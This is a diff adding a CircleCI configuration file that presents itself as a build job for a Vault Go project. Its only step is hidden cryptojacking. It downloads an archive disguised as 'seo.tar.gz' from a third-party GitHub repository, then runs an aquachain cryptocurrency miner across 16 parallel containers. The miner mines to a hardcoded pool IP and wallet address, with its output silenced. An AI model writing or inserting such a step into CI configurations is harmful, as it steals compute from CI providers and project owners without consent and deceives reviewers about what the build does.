@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 16
+    resource_class: small
+    working_directory: /go/src/github.com/hashicorp/vault
+    steps:
+      - run: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
